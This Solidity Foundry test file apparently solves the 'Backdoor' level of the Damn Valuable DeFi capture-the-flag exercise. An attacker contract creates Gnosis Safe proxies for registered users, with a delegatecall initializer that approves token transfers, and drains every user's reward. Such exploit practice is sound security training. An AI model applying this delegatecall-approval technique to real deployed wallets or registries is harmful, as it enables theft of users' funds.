// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol";
import {GnosisSafe} from "gnosis/GnosisSafe.sol";
import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
import {GnosisSafeProxy} from "gnosis/proxies/GnosisSafeProxy.sol";
import {IProxyCreationCallback} from "gnosis/proxies/IProxyCreationCallback.sol";

contract Backdoor is Test {
    uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
    uint256 internal constant NUM_USERS = 4;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    GnosisSafe internal masterCopy;
    GnosisSafeProxyFactory internal walletFactory;
    WalletRegistry internal walletRegistry;
    address[] internal users;
    address payable internal attacker;
    address internal alice;
    address internal bob;
    address internal charlie;
    address internal david;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        users = utils.createUsers(NUM_USERS);

        alice = users[0];
        bob = users[1];
        charlie = users[2];
        david = users[3];

        vm.label(alice, "Alice");
        vm.label(bob, "Bob");
        vm.label(charlie, "Charlie");
        vm.label(david, "David");

        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");

        // Deploy Gnosis Safe master copy and factory contracts
        masterCopy = new GnosisSafe();
        vm.label(address(masterCopy), "Gnosis Safe");

        walletFactory = new GnosisSafeProxyFactory();
        vm.label(address(walletFactory), "Wallet Factory");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        // Deploy the registry
        walletRegistry = new WalletRegistry(
            address(masterCopy),
            address(walletFactory),
            address(dvt),
            users
        );

        // Users are registered as beneficiaries
        for (uint256 i = 0; i < NUM_USERS; i++) {
            assertTrue(walletRegistry.beneficiaries(users[i]));
        }

        // Transfer tokens to be distributed to the registry
        dvt.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */

        vm.startPrank(attacker);

        BackdoorAttacker backdoorAttacker =
            new BackdoorAttacker(address(masterCopy), address(walletFactory), address(walletRegistry), address(dvt));

        backdoorAttacker.attack(users);

        vm.stopPrank();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */
        for (uint256 i = 0; i < NUM_USERS; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            if (wallet == address(0)) {
                emit log("User did not register a wallet");
                fail();
            }

            // User is no longer registered as a beneficiary
            assertTrue(!walletRegistry.beneficiaries(users[i]));
        }

        // Attacker must have taken all tokens
        assertEq(dvt.balanceOf(attacker), AMOUNT_TOKENS_DISTRIBUTED);
    }
}

contract BackdoorAttacker {
    address private immutable masterCopy;
    address private immutable walletFactory;
    address private immutable registry;
    DamnValuableToken private immutable dvt;

    constructor(address _masterCopy, address _walletFactory, address _registry, address _token) {
        masterCopy = _masterCopy;
        walletFactory = _walletFactory;
        registry = _registry;
        dvt = DamnValuableToken(_token);
    }

    function delegateApprove(address _spender) external {
        dvt.approve(_spender, 10 ether);
    }

    function attack(address[] memory _beneficiaries) external {
        // For every registered user we'll create a wallet
        for (uint256 i = 0; i < 4; i++) {
            address[] memory beneficiary = new address[](1);
            beneficiary[0] = _beneficiaries[i];

            // Create the data that will be passed to the proxyCreated function on WalletRegistry
            // The parameters correspond to the GnosisSafe::setup() contract
            bytes memory _initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector, // Selector for the setup() function call
                beneficiary, // _owners =>  List of Safe owners.
                1, // _threshold =>  Number of required confirmations for a Safe transaction.
                address(this), //  to => Contract address for optional delegate call.
                abi.encodeWithSignature("delegateApprove(address)", address(this)), // data =>  Data payload for optional delegate call.
                address(0), //  fallbackHandler =>  Handler for fallback calls to this contract
                0, //  paymentToken =>  Token that should be used for the payment (0 is ETH)
                0, // payment => Value that should be paid
                0 //  paymentReceiver => Adddress that should receive the payment (or 0 if tx.origin)
            );

            // Create new proxies on behalf of other users
            GnosisSafeProxy _newProxy = GnosisSafeProxyFactory(walletFactory).createProxyWithCallback(
                masterCopy, // _singleton => Address of singleton contract.
                _initializer, // initializer => Payload for message call sent to new proxy contract.
                i, // saltNonce => Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
                IProxyCreationCallback(registry) //  callback => Function that will be called after the new proxy contract has been deployed and initialized.
            );

            //Transfer to caller
            dvt.transferFrom(address(_newProxy), msg.sender, 10 ether);
        }
    }
}
